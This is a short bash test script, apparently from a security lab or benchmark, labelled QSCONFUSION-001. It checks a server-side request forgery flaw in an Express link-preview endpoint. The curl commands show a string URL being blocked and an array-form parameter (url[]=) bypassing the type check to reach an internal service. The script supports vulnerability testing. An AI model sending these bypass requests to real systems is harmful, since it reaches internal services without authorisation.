#!/usr/bin/env bash
# QSCONFUSION-001 (CWE-843): Express/qs parses ?url[]=... into an ARRAY, so the
# `if (typeof url === 'string')` SSRF guard is skipped and the internal-only sink
# (unreachable via a plain string URL, which is blocked) is fetched.
set -eu; . "$(dirname "$0")/_lib.sh"
# the string form is blocked...
code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/tools/link-preview?url=http://internal-sink:8025/")
[ "$code" = "400" ]
# ...but the array form bypasses the guard and reaches the sink
curl -s "$TARGET/api/tools/link-preview?url[]=http://internal-sink:8025/" | grep -q 'NESTJS-INTERNAL-SINK'
